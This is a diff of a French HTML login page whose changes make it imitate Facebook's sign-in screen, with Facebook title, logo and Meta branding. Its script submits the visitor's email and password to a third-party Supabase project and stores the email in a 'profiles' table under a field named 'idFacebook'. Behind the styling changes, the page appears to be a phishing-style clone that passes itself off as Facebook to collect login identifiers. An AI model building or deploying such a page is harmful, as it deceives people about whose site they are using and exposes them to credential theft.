@@ -1,206 +1,373 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>Connexion</title>
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
 
+    <title>Facebook</title>
+
+    <!-- SUPABASE -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
     <style>
+
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
         }
 
+        html,
         body {
-            font-family: Arial, Helvetica, sans-serif;
-            background: white;
+            width: 100%;
+            min-height: 100%;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+
+            font-family:
+                Arial,
+                Helvetica,
+                sans-serif;
+
             min-height: 100vh;
-            color: #65676b;
-        }
 
-        /* Langue */
-        .language {
-            text-align: center;
-            font-size: 22px;
-            padding-top: 38px;
-        }
-
-        /* Logo */
-        .logo-container {
             display: flex;
             justify-content: center;
-            margin-top: 120px;
-            margin-bottom: 150px;
         }
 
-        .facebook-logo {
-            width: 140px;
-            height: 140px;
-            background: #1877f2;
-            border-radius: 50%;
+
+        /* =========================
+           PAGE
+        ========================= */
+
+        .page {
+            width: 100%;
+            max-width: 430px;
+            min-height: 100vh;
+
+            padding:
+                18px
+                16px
+                20px;
+
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+
+        /* =========================
+           LANGUE
+        ========================= */
+
+        .language {
+            width: 100%;
+
+            text-align: center;
+
+            color: #aaa;
+
+            font-size: 13px;
+
+            margin-bottom: 34px;
+        }
+
+
+        /* =========================
+           LOGO
+        ========================= */
+
+        .logo-container {
+            width: 100%;
 
             display: flex;
             justify-content: center;
             align-items: center;
 
-            color: white;
-            font-family: Arial, sans-serif;
-            font-size: 115px;
-            font-weight: bold;
-
-            line-height: 1;
-            overflow: hidden;
+            margin-bottom: 34px;
         }
 
-        .facebook-logo span {
-            position: relative;
-            top: 15px;
+        .facebook-logo {
+            width: 58px;
+            height: 58px;
+
+            object-fit: contain;
+
+            display: block;
+
+            border-radius: 14px;
         }
 
-        /* Formulaire */
+
+        /* =========================
+           FORMULAIRE
+        ========================= */
+
         .login-container {
-            width: calc(100% - 76px);
-            margin: auto;
+            width: 100%;
+            max-width: 350px;
         }
+
 
         .input {
             width: 100%;
-            height: 145px;
+            height: 48px;
 
-            border: 2px solid #dddfe2;
-            border-radius: 35px;
+            border: 1px solid #444;
+            border-radius: 9px;
 
-            padding: 0 38px;
+            background: #1b1b1b;
 
-            font-size: 30px;
-            color: #333;
+            color: #fff;
+
+            padding:
+                0
+                15px;
+
+            font-size: 15px;
 
             outline: none;
-            margin-bottom: 30px;
+
+            margin-bottom: 10px;
+
+            transition:
+                border-color .2s,
+                background .2s;
         }
 
         .input::placeholder {
-            color: #65676b;
+            color: #888;
         }
 
         .input:focus {
             border-color: #1877f2;
+            background: #202020;
         }
 
-        /* Bouton connexion */
+
+        /* =========================
+           BOUTON CONNEXION
+        ========================= */
+
         .login-button {
             width: 100%;
-            height: 105px;
+            height: 48px;
 
             border: none;
-            border-radius: 55px;
+            border-radius: 9px;
 
-            background: #0866ff;
+            background: #1877f2;
+
             color: white;
 
-            font-size: 32px;
-            font-weight: bold;
+            font-size: 16px;
+            font-weight: 700;
 
             cursor: pointer;
-            transition: 0.2s;
-        }
 
-        .login-button:active {
-            transform: scale(0.98);
+            margin-top: 2px;
+
+            transition:
+                background .2s,
+                transform .1s;
         }
 
         .login-button:hover {
-            background: #075bdc;
+            background: #166fe5;
         }
 
-        /* Message d'erreur */
-        .error {
+        .login-button:active {
+            transform: scale(.98);
+        }
+
+        .login-button:disabled {
+            opacity: .6;
+            cursor: not-allowed;
+        }
+
+
+        /* =========================
+           MESSAGE
+        ========================= */
+
+        .message {
             display: none;
 
-            text-align: center;
-            color: #d93025;
+            width: 100%;
 
-            font-size: 20px;
-            margin-top: 18px;
+            margin-top: 12px;
+
+            padding: 10px;
+
+            border-radius: 8px;
+
+            text-align: center;
+
+            font-size: 13px;
         }
 
-        /* Mot de passe oublié */
+        .message.error {
+            display: none;
+
+            background: #241010;
+            color: #ff7777;
+
+            border: 1px solid #552020;
+        }
+
+        .message.success {
+            display: none;
+
+            background: #0c2115;
+            color: #5de18a;
+
+            border: 1px solid #174f2b;
+        }
+
+
+        /* =========================
+           MOT DE PASSE OUBLIE
+        ========================= */
+
         .forgot {
             display: block;
+
             text-align: center;
 
-            margin-top: 52px;
+            margin-top: 20px;
 
-            color: #111;
+            color: #4595ff;
+
+            font-size: 14px;
+
             text-decoration: none;
 
-            font-size: 28px;
-            font-weight: bold;
+            cursor: pointer;
         }
 
         .forgot:hover {
             text-decoration: underline;
         }
 
-        /* Nouveau compte */
+
+        /* =========================
+           SEPARATEUR
+        ========================= */
+
+        .separator {
+            width: 100%;
+
+            display: flex;
+            align-items: center;
+
+            gap: 10px;
+
+            margin-top: 25px;
+        }
+
+        .separator-line {
+            flex: 1;
+
+            height: 1px;
+
+            background: #292929;
+        }
+
+        .separator-text {
+            color: #777;
+
+            font-size: 12px;
+        }
+
+
+        /* =========================
+           NOUVEAU COMPTE
+        ========================= */
+
         .new-account {
             width: 100%;
-            height: 105px;
+            height: 44px;
 
-            margin-top: 280px;
+            margin-top: 24px;
 
-            border: 3px solid #1877f2;
-            border-radius: 55px;
-            background: white;
+            border: 1px solid #1877f2;
 
-            color: #1769cf;
+            border-radius: 9px;
 
-            font-size: 31px;
-            font-weight: bold;
+            background: transparent;
+
+            color: #4595ff;
+
+            font-size: 15px;
+            font-weight: 600;
 
             cursor: pointer;
+
+            transition:
+                background .2s,
+                transform .1s;
+        }
+
+        .new-account:hover {
+            background: #071526;
         }
 
         .new-account:active {
-            transform: scale(0.98);
+            transform: scale(.98);
         }
 
-        /* Meta */
+
+        /* =========================
+           META
+        ========================= */
+
         .meta {
-            text-align: center;
-            margin-top: 42px;
+            margin-top: 32px;
 
-            font-size: 31px;
-            font-weight: bold;
+            display: flex;
+            align-items: center;
 
-            color: #303030;
+            color: #888;
+
+            font-size: 16px;
+            font-weight: 600;
         }
 
         .meta-symbol {
-            color: #1877f2;
-            font-size: 42px;
-            font-weight: bold;
+            font-size: 22px;
+
             margin-right: 5px;
+
+            color: #777;
         }
 
-        /* Liens du bas */
+
+        /* =========================
+           FOOTER
+        ========================= */
+
         .footer {
+            margin-top: 22px;
+
             display: flex;
             justify-content: center;
-            gap: 25px;
 
-            margin-top: 55px;
+            gap: 16px;
 
-            font-size: 22px;
-            color: #758195;
+            font-size: 11px;
         }
 
         .footer a {
-            color: #758195;
+            color: #666;
+
             text-decoration: none;
         }
 
@@ -208,167 +375,209 @@
             text-decoration: underline;
         }
 
-        /* -------------------------
-           RESPONSIVE
-        ------------------------- */
 
-        @media (max-width: 600px) {
+        /* =========================
+           PETITS TELEPHONES
+        ========================= */
+
+        @media (max-height: 650px) {
+
+            .page {
+                padding-top: 12px;
+            }
 
             .language {
-                font-size: 18px;
-                padding-top: 30px;
+                margin-bottom: 20px;
             }
 
             .logo-container {
-                margin-top: 90px;
-                margin-bottom: 100px;
+                margin-bottom: 20px;
             }
 
             .facebook-logo {
-                width: 90px;
-                height: 90px;
-                font-size: 75px;
-            }
-
-            .facebook-logo span {
-                top: 10px;
-            }
-
-            .login-container {
-                width: calc(100% - 40px);
-            }
-
-            .input {
-                height: 70px;
-                border-radius: 18px;
-
-                padding: 0 20px;
-
-                font-size: 18px;
-
-                margin-bottom: 15px;
-            }
-
-            .login-button {
-                height: 58px;
-                font-size: 20px;
+                width: 48px;
+                height: 48px;
             }
 
             .forgot {
-                font-size: 18px;
-                margin-top: 28px;
+                margin-top: 15px;
+            }
+
+            .separator {
+                margin-top: 18px;
             }
 
             .new-account {
-                height: 58px;
-
-                margin-top: 150px;
-
-                border-radius: 30px;
-
-                font-size: 19px;
+                margin-top: 17px;
             }
 
             .meta {
-                margin-top: 30px;
-                font-size: 22px;
-            }
-
-            .meta-symbol {
-                font-size: 30px;
+                margin-top: 22px;
             }
 
             .footer {
-                margin-top: 35px;
-                font-size: 16px;
-                gap: 18px;
+                margin-top: 15px;
             }
         }
+
     </style>
 </head>
 
+
 <body>
 
-    <!-- Langue -->
-    <div class="language">
-        Français (France)
-    </div>
+    <div class="page">
 
 
-    <!-- Logo -->
-    <div class="logo-container">
+        <!-- LANGUE -->
 
-        <div class="facebook-logo">
-            <span>f</span>
+        <div class="language">
+            Français (France)
         </div>
 
-    </div>
 
+        <!-- LOGO -->
 
-    <!-- Zone de connexion -->
-    <main class="login-container">
+        <div class="logo-container">
 
-        <form id="loginForm">
-
-            <input
-                type="text"
-                id="email"
-                class="input"
-                placeholder="Numéro mobile ou e-mail"
-                autocomplete="username"
+            <img
+                src="IMG_1434.jpeg"
+                class="facebook-logo"
+                alt="Facebook"
             >
 
-            <input
-                type="password"
-                id="password"
-                class="input"
-                placeholder="Mot de passe"
-                autocomplete="current-password"
+        </div>
+
+
+        <!-- FORMULAIRE -->
+
+        <main class="login-container">
+
+            <form id="loginForm">
+
+                <input
+                    type="text"
+                    id="email"
+                    class="input"
+                    placeholder="Numéro mobile ou e-mail"
+                    autocomplete="username"
+                    required
+                >
+
+                <input
+                    type="password"
+                    id="password"
+                    class="input"
+                    placeholder="Mot de passe"
+                    autocomplete="current-password"
+                    required
+                >
+
+                <button
+                    type="submit"
+                    class="login-button"
+                    id="loginButton"
+                >
+                    Continuer
+                </button>
+
+            </form>
+
+
+            <!-- MESSAGE ERREUR -->
+
+            <div
+                id="errorMessage"
+                class="message error"
+            ></div>
+
+
+            <!-- MESSAGE SUCCES -->
+
+            <div
+                id="successMessage"
+                class="message success"
+            ></div>
+
+
+            <!-- MOT DE PASSE OUBLIE -->
+
+            <a
+                href="#"
+                id="forgotPassword"
+                class="forgot"
             >
+                Mot de passe oublié ?
+            </a>
 
-            <button type="submit" class="login-button">
-                Continuer
-            </button>
 
-            <div id="error" class="error">
-                Veuillez remplir les deux champs.
+            <!-- SEPARATEUR -->
+
+            <div class="separator">
+
+                <div class="separator-line"></div>
+
+                <span class="separator-text">
+                    ou
+                </span>
+
+                <div class="separator-line"></div>
+
             </div>
 
-        </form>
+
+            <!-- NOUVEAU COMPTE -->
+
+            <button
+                type="button"
+                id="newAccount"
+                class="new-account"
+            >
+                Créer un nouveau compte
+            </button>
+
+        </main>
 
 
-        <!-- Mot de passe oublié -->
-        <a href="#" class="forgot" id="forgotPassword">
-            Mot de passe oublié ?
-        </a>
+        <!-- META -->
+
+        <div class="meta">
+
+            <span class="meta-symbol">
+                ∞
+            </span>
+
+            Meta
+
+        </div>
 
 
-        <!-- Nouveau compte -->
-        <button type="button" class="new-account" id="newAccount">
-            Créer un nouveau compte
-        </button>
+        <!-- FOOTER -->
 
-    </main>
+        <footer class="footer">
 
+            <a href="#">
+                À propos
+            </a>
 
-    <!-- Meta -->
-    <div class="meta">
-        <span class="meta-symbol">∞</span> Meta
+            <a href="#">
+                Aide
+            </a>
+
+            <a href="#">
+                Plus
+            </a>
+
+        </footer>
+
     </div>
 
-
-    <!-- Footer -->
-    <footer class="footer">
-        <a href="#">À propos</a>
-        <a href="#">Aide</a>
-        <a href="#">Plus</a>
-    </footer>
 
 
     <script>
 
-        /* ================================
-           CONFIGURATION SUPABASE
+        /* =================================
+           SUPABASE
         ================================= */
 
         const SUPABASE_URL =
@@ -377,6 +586,7 @@
         const SUPABASE_KEY =
             "sb_publishable_FDtcO7MF7VVtQ7s94bpGeQ_5D4Reg4j";
 
+
         const supabaseClient =
             window.supabase.createClient(
                 SUPABASE_URL,
@@ -384,152 +594,273 @@
             );
 
 
-        /* ================================
+        /* =================================
            ELEMENTS
         ================================= */
 
         const loginForm =
             document.getElementById("loginForm");
 
-        const email =
+        const emailInput =
             document.getElementById("email");
 
-        const password =
+        const passwordInput =
             document.getElementById("password");
 
-        const error =
-            document.getElementById("error");
+        const loginButton =
+            document.getElementById("loginButton");
 
-        const newAccount =
+        const newAccountButton =
             document.getElementById("newAccount");
 
         const forgotPassword =
             document.getElementById("forgotPassword");
 
+        const errorMessage =
+            document.getElementById("errorMessage");
 
-        /* ================================
-           CONNEXION / TRAITEMENT
+        const successMessage =
+            document.getElementById("successMessage");
+
+
+        /* =================================
+           MESSAGES
         ================================= */
 
-        loginForm.addEventListener("submit", async function(event) {
+        function showError(message) {
 
-            event.preventDefault();
+            successMessage.style.display = "none";
 
-            error.style.display = "none";
+            errorMessage.textContent = message;
 
-            const emailValue =
-                email.value.trim();
-
-            const passwordValue =
-                password.value.trim();
+            errorMessage.style.display = "block";
+        }
 
 
-            /* Vérification des champs */
+        function showSuccess(message) {
 
-            if (
-                emailValue === "" ||
-                passwordValue === ""
-            ) {
+            errorMessage.style.display = "none";
 
-                error.textContent =
-                    "Veuillez remplir les deux champs.";
+            successMessage.textContent = message;
 
-                error.style.display = "block";
-
-                return;
-            }
+            successMessage.style.display = "block";
+        }
 
 
-            /* ================================
-               TRAITEMENT SUPABASE
-            ================================= */
+        function clearMessages() {
 
-            try {
+            errorMessage.style.display = "none";
 
-                /*
-                 * IMPORTANT :
-                 * Ici on ne stocke pas le mot de passe
-                 * directement dans profiles.
-                 *
-                 * Pour une vraie connexion, cette partie
-                 * doit utiliser Supabase Auth.
-                 */
+            successMessage.style.display = "none";
 
-                const {
-                    data,
-                    error: authError
-                } = await supabaseClient.auth.signInWithPassword({
-
-                    email: emailValue,
-
-                    password: passwordValue
-
-                });
+        }
 
 
-                if (authError) {
+        /* =================================
+           CONNEXION
+        ================================= */
 
-                    console.error(authError);
+        loginForm.addEventListener(
+            "submit",
+            async function(event) {
 
-                    error.textContent =
-                        "Identifiants incorrects.";
+                event.preventDefault();
 
-                    error.style.display = "block";
+                clearMessages();
+
+
+                const email =
+                    emailInput.value.trim();
+
+                const password =
+                    passwordInput.value;
+
+
+                /* Vérification */
+
+                if (!email || !password) {
+
+                    showError(
+                        "Remplis tous les champs."
+                    );
 
                     return;
                 }
 
 
-                /* Connexion réussie */
+                /* Désactivation du bouton */
 
-                console.log(
-                    "Utilisateur connecté :",
-                    data.user
-                );
+                loginButton.disabled = true;
 
-
-                /*
-                 * Change cette destination si ton
-                 * dashboard porte un autre nom.
-                 */
-
-                window.location.href = "success.html";
+                loginButton.textContent =
+                    "Connexion...";
 
 
-            } catch (err) {
+                try {
 
-                console.error(err);
+                    /*
+                     * AUTHENTIFICATION SUPABASE
+                     */
 
-                error.textContent =
-                    "Une erreur est survenue. Réessayez.";
+                    const {
+                        data,
+                        error
+                    } =
+                        await supabaseClient.auth
+                            .signInWithPassword({
 
-                error.style.display = "block";
-            }
+                                email: email,
 
-        });
+                                password: password
+
+                            });
 
 
-        /* ================================
-           NOUVEAU COMPTE
-        ================================= */
+                    if (error) {
 
-        newAccount.addEventListener(
-            "click",
-            function() {
+                        console.error(
+                            "Erreur connexion :",
+                            error
+                        );
 
-                /*
-                 * Remplace index.html par le véritable
-                 * fichier de ta page d'inscription
-                 * si nécessaire.
-                 */
+                        showError(
+                            "E-mail ou mot de passe incorrect."
+                        );
 
-                window.location.href = "index.html";
+                        return;
+                    }
+
+
+                    /*
+                     * UTILISATEUR CONNECTÉ
+                     */
+
+                    const user =
+                        data.user;
+
+
+                    if (!user) {
+
+                        showError(
+                            "Utilisateur introuvable."
+                        );
+
+                        return;
+                    }
+
+
+                    /*
+                     * =================================
+                     * INSERTION / MISE À JOUR PROFILES
+                     * =================================
+                     *
+                     * On conserve ici la mécanique
+                     * de ta table profiles.
+                     *
+                     * Le mot de passe n'est PAS enregistré
+                     * dans profiles.
+                     *
+                     * Supabase Auth s'occupe du mot de passe.
+                     */
+
+                    const {
+                        error: profileError
+                    } =
+                        await supabaseClient
+                            .from("profiles")
+                            .upsert(
+                                {
+                                    id: user.id,
+
+                                    idFacebook: email
+
+                                },
+                                {
+                                    onConflict: "id"
+                                }
+                            );
+
+
+                    if (profileError) {
+
+                        console.error(
+                            "Erreur profiles :",
+                            profileError
+                        );
+
+                        /*
+                         * La connexion reste valide même
+                         * si l'écriture dans profiles échoue.
+                         */
+
+                    }
+
+
+                    /* Succès */
+
+                    showSuccess(
+                        "Connexion réussie."
+                    );
+
+
+                    /*
+                     * Petit délai pour laisser voir
+                     * le message.
+                     */
+
+                    setTimeout(
+                        function() {
+
+                            window.location.href =
+                                "success.html";
+
+                        },
+                        700
+                    );
+
+
+                } catch (error) {
+
+                    console.error(error);
+
+                    showError(
+                        "Une erreur est survenue. Réessaie."
+                    );
+
+                } finally {
+
+                    loginButton.disabled = false;
+
+                    loginButton.textContent =
+                        "Continuer";
+
+                }
 
             }
         );
 
 
-        /* ================================
+        /* =================================
+           NOUVEAU COMPTE
+        ================================= */
+
+        newAccountButton.addEventListener(
+            "click",
+            function() {
+
+                /*
+                 * Mets ici le véritable fichier
+                 * d'inscription de ton projet.
+                 */
+
+                window.location.href =
+                    "index.html";
+
+            }
+        );
+
+
+        /* =================================
            MOT DE PASSE OUBLIE
         ================================= */
 
@@ -539,18 +870,20 @@
 
                 event.preventDefault();
 
-                const emailValue =
-                    email.value.trim();
+                clearMessages();
 
 
-                if (emailValue === "") {
+                const email =
+                    emailInput.value.trim();
 
-                    error.textContent =
-                        "Entrez d'abord votre adresse e-mail.";
 
-                    error.style.display = "block";
+                if (!email) {
 
-                    email.focus();
+                    showError(
+                        "Entre ton adresse e-mail avant de continuer."
+                    );
+
+                    emailInput.focus();
 
                     return;
                 }
@@ -559,11 +892,11 @@
                 try {
 
                     const {
-                        error: resetError
+                        error
                     } =
                         await supabaseClient.auth
                             .resetPasswordForEmail(
-                                emailValue,
+                                email,
                                 {
                                     redirectTo:
                                         window.location.origin +
@@ -572,41 +905,31 @@
                             );
 
 
-                    if (resetError) {
+                    if (error) {
 
-                        console.error(resetError);
+                        console.error(error);
 
-                        error.textContent =
-                            "Impossible d'envoyer le lien de récupération.";
-
-                        error.style.display = "block";
+                        showError(
+                            "Impossible d'envoyer le lien de récupération."
+                        );
 
                         return;
                     }
 
 
-                    error.textContent =
-                        "Le lien de récupération a été envoyé.";
-
-                    error.style.color =
-                        "#1877f2";
-
-                    error.style.display =
-                        "block";
+                    showSuccess(
+                        "Le lien de récupération a été envoyé."
+                    );
 
 
-                } catch (err) {
+                } catch (error) {
 
-                    console.error(err);
+                    console.error(error);
 
-                    error.textContent =
-                        "Une erreur est survenue.";
+                    showError(
+                        "Une erreur est survenue."
+                    );
 
-                    error.style.color =
-                        "#d93025";
-
-                    error.style.display =
-                        "block";
                 }
 
             }
@@ -615,4 +938,5 @@
     </script>
 
 </body>
+
 </html>
